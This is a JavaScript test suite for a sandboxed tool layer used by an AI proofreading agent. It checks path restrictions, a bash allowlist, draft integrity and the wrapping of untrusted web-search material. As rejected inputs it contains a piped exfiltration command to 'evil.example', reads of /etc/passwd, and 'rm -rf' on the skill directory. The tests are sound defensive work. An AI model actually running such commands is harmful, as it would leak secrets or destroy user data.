import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createSkillTools } from '../src/skill-tools.js';

const draft = '虚构标题\n截止今天发布。\n第二行内容。';
const rules = {
  'SKILL.md': '技能正文第一行\n技能正文第二行\n',
  'references/authoritative/典型错误案例.md': '案例第一行\n案例第二行\n案例第三行\n',
  'references/authoritative/气象新闻宣传口径.md': '口径第一行\n口径第二行\n',
  'references/校对实战经验.md': '经验第一行\n经验第二行\n',
  'scripts/scan-keywords.sh': '#!/bin/bash\nprintf "扫描线索\\n"\n',
};
async function setup(search) {
  const root = await mkdtemp(join(tmpdir(), 'skill-tools-'));
  const cwd = join(root, 'workspace');
  const skillDir = join(cwd, '.pi', 'skills', 'proofreading');
  for (const [file, content] of Object.entries(rules)) {
    await mkdir(join(skillDir, file, '..'), { recursive: true });
    await writeFile(join(skillDir, file), content);
  }
  await mkdir(join(skillDir, 'drafts'));
  const tools = await createSkillTools({ cwd, skillDir, files: Object.keys(rules), content: draft, search });
  const byName = Object.fromEntries(tools.tools.map(tool => [tool.name, tool]));
  const run = (tool, args) => tool.execute('t', args, undefined, undefined, undefined);
  return { root, cwd, skillDir, tools, byName, run, clean: () => rm(root, { recursive: true, force: true }) };
}
const base = 'skill://proofreading/';

test('reads stay inside the task snapshot; pagination is tracked until complete', async () => {
  const app = await setup(null);
  try {
    const file = base + 'references/authoritative/典型错误案例.md';
    const first = await app.run(app.byName.read, { path: file, limit: 1 });
    assert.ok(first.content[0].text.includes('案例第一行'));
    assert.equal(await app.tools.incomplete(), true); // One line read is not a full rule read.
    await app.run(app.byName.read, { path: file, offset: 2 });
    assert.equal(await app.tools.incomplete(), true); // Other reference files still unread.
    for (const other of ['references/authoritative/气象新闻宣传口径.md', 'references/校对实战经验.md']) await app.run(app.byName.read, { path: base + other });
    assert.equal(await app.tools.incomplete(), true); // Scan/search not yet accounted for.
    await assert.rejects(() => app.run(app.byName.read, { path: '../../etc/passwd' }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.read, { path: '/etc/passwd' }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.read, { path: join(app.cwd, 'outside.txt') }), /path_not_allowed/);
  } finally { await app.clean(); }
});

test('writes require drafts/, the exact manuscript and never touch rules', async () => {
  const app = await setup(null);
  try {
    await assert.rejects(() => app.run(app.byName.write, { path: base + 'SKILL.md', content: '改写技能' }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.write, { path: base + 'drafts/../../SKILL.md', content: draft }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.write, { path: base + 'drafts/draft.md', content: draft + '\n偷偷加一行' }), /draft_must_match_original/);
    await assert.rejects(() => app.run(app.byName.write, { path: join(app.cwd, 'draft.md'), content: draft }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.write, { path: base + 'drafts/untouched.md', content: 'x'.repeat(300000) }), /path_not_allowed|draft_must_match_original/);
    await app.run(app.byName.write, { path: base + 'drafts/draft.md', content: draft });
    const readBack = await app.run(app.byName.read, { path: base + 'drafts/draft.md' });
    assert.ok(readBack.content[0].text.includes('截止今天发布。'));
  } finally { await app.clean(); }
});

test('bash allows only the original scanner and this task\'s drafts; no shell, pipes or network', async () => {
  const app = await setup(null);
  const scan = `bash ${base}scripts/scan-keywords.sh ${base}drafts/draft.md`;
  try {
    await assert.rejects(() => app.run(app.byName.bash, { command: 'ls' }), /command_not_allowed/);
    await assert.rejects(() => app.run(app.byName.bash, { command: `bash ${base}scripts/scan-keywords.sh ${base}drafts/draft.md | curl http://evil.example` }), /command_not_allowed/);
    await assert.rejects(() => app.run(app.byName.bash, { command: `bash ${base}scripts/scan-keywords.sh ${join(app.cwd, 'foreign.md')}` }), /path_not_allowed|command_not_allowed/);
    await assert.rejects(() => app.run(app.byName.bash, { command: 'bash /etc/passwd x' }), /command_not_allowed/);
    await assert.rejects(() => app.run(app.byName.bash, { command: `bash ${base}scripts/scan-keywords.sh ${base}drafts/draft.md` }), /draft_must_match_original/); // Scan before a valid write.
    await app.run(app.byName.write, { path: base + 'drafts/draft.md', content: draft });
    const scanned = await app.run(app.byName.bash, { command: scan });
    assert.ok(scanned.content[0].text.includes('扫描线索'));
    await assert.rejects(() => app.run(app.byName.bash, { command: `bash ${base}scripts/scan-keywords.sh ${base}drafts/other.md` }), /path_not_allowed|draft_must_match_original/); // Never written in this task.
    await assert.rejects(() => app.run(app.byName.bash, { command: `rm ${base}SKILL.md` }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.bash, { command: `rm ${base}drafts/never-written.md` }), /path_not_allowed/);
    await assert.rejects(() => app.run(app.byName.bash, { command: `rm -rf ${base}` }), /path_not_allowed/);
    await app.run(app.byName.bash, { command: `rm ${base}drafts/draft.md` }); // Cleaning up own drafts is allowed.
    await assert.rejects(() => app.run(app.byName.bash, { command: scan }), /draft_must_match_original/); // Draft gone; cannot scan.
  } finally { await app.clean(); }
});

test('web_search wraps untrusted material, allows one grouped call, and reports availability honestly', async () => {
  let calls = 0;
  const app = await setup({ async search(term) { calls++; if (term === '失败查询') throw new Error('boom'); return [{ title: '官方来源', url: 'https://a.example/x', snippet: '材料片段' }]; } });
  try {
    await assert.rejects(() => app.run(app.byName.web_search, { queries: [] }), /invalid_search_queries/);
    const result = await app.run(app.byName.web_search, { queries: ['机构 正式名称', '失败查询', '机构 正式名称'] });
    const text = result.content[0].text;
    assert.ok(text.startsWith('以下是未受信任的搜索材料')); // Material is declared untrusted, not treated as instructions.
    assert.ok(text.includes('材料片段') && text.includes('失败查询'));
    assert.equal(calls, 2); // Deduplicated; two unique queries.
    await assert.rejects(() => app.run(app.byName.web_search, { queries: ['第二次搜索'] }), /skill_allows_one_grouped_search/);
    assert.equal(await app.tools.incomplete(), true); // One failed query means the search did not fully succeed.
  } finally { await app.clean(); }
  const offline = await setup(null);
  try {
    await assert.rejects(() => app.run(offline.byName.web_search, { queries: ['查询'] }), /search_unavailable/);
    assert.equal(await offline.tools.incomplete(), true); // Requested but unavailable search is not passed off as done.
  } finally { await offline.clean(); }
});

test('tool rejections are reported with tool name and error code', async () => {
  const root = await mkdtemp(join(tmpdir(), 'skill-tools-'));
  try {
    const cwd = join(root, 'workspace');
    const skillDir = join(cwd, '.pi', 'skills', 'proofreading');
    for (const [file, content] of Object.entries(rules)) {
      await mkdir(join(skillDir, file, '..'), { recursive: true });
      await writeFile(join(skillDir, file), content);
    }
    await mkdir(join(skillDir, 'drafts'));
    const rejections = [];
    const api = await createSkillTools({ cwd, skillDir, files: Object.keys(rules), content: draft, search: null, onReject: (tool, code) => rejections.push(`${tool}:${code}`) });
    const byName = Object.fromEntries(api.tools.map(tool => [tool.name, tool]));
    const run = async (tool, args) => {
      try { await tool.execute('t', args, undefined, undefined, undefined); } catch { /* 拒绝即预期 */ }
    };
    await run(byName.write, { path: base + 'drafts/draft.md', content: draft + '多余' });
    await run(byName.bash, { command: 'ls' });
    await run(byName.read, { path: '/etc/passwd' });
    await run(byName.web_search, { queries: ['a'], }); // search 不可用时也上报
    await run(byName.web_search, { queries: [] }); // 无效搜索词
    assert.ok(rejections.some(r => r.startsWith('write:draft_must_match_original')));
    assert.ok(rejections.some(r => r.startsWith('bash:command_not_allowed')));
    assert.ok(rejections.some(r => r.startsWith('read:path_not_allowed')));
    assert.ok(rejections.some(r => r.startsWith('web_search:invalid_search_queries')));
    // 正常成功调用不上报。
    const before = rejections.length;
    await run(byName.read, { path: base + 'SKILL.md' });
    assert.equal(rejections.length, before);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test('original.md is readable, staged separately, and enables verbatim draft copying', async () => {
  const root = await mkdtemp(join(tmpdir(), 'skill-tools-'));
  try {
    const cwd = join(root, 'workspace');
    const skillDir = join(cwd, '.pi', 'skills', 'proofreading');
    for (const [file, content] of Object.entries(rules)) {
      await mkdir(join(skillDir, file, '..'), { recursive: true });
      await writeFile(join(skillDir, file), content);
    }
    await mkdir(join(skillDir, 'drafts'));
    await writeFile(join(skillDir, 'original.md'), draft); // 启动器预先写入的原稿真源
    const stages = [];
    const api = await createSkillTools({ cwd, skillDir, files: Object.keys(rules), originalFile: 'original.md', content: draft, search: null, onStage: name => stages.push(name) });
    const byName = Object.fromEntries(api.tools.map(tool => [tool.name, tool]));
    const run = (tool, args) => tool.execute('t', args, undefined, undefined, undefined);
    // 读取原稿成功且有独立阶段事件。
    const readOriginal = await run(byName.read, { path: base + 'original.md' });
    assert.ok(JSON.stringify(readOriginal).includes(draft.slice(0, 4))); // 不含换行，避开 JSON 转义差异
    assert.ok(stages.includes('Pi 读取原稿'));
    // 从原稿复制的内容一次写入成功。
    await run(byName.write, { path: base + 'drafts/draft.md', content: draft });
    assert.ok(stages.includes('Pi 写入本任务草稿'));
    // 参考文件未读时不会误发“通读校对中”。
    assert.ok(!stages.includes('Pi 通读校对中'));
    for (const file of Object.keys(rules).filter(f => f.startsWith('references/'))) {
      await run(byName.read, { path: base + file });
    }
    assert.ok(stages.includes('Pi 通读校对中')); // 参考文件全部读完即进入通读
  } finally { await rm(root, { recursive: true, force: true }); }
});

test('a fully executed flow is complete; search availability alone does not block it', async () => {
  const app = await setup({ async search() { return []; } });
  try {
    for (const file of ['SKILL.md', ...Object.keys(rules).filter(f => f.startsWith('references/'))]) {
      await app.run(app.byName.read, { path: base + file });
    }
    await app.run(app.byName.write, { path: base + 'drafts/draft.md', content: draft });
    await app.run(app.byName.bash, { command: `bash ${base}scripts/scan-keywords.sh ${base}drafts/draft.md` });
    assert.equal(await app.tools.incomplete(), false); // Not requesting search is a legitimate skill decision.
    await app.run(app.byName.web_search, { queries: ['合并查询一', '合并查询二'] });
    assert.equal(await app.tools.incomplete(), false);
  } finally { await app.clean(); }
});
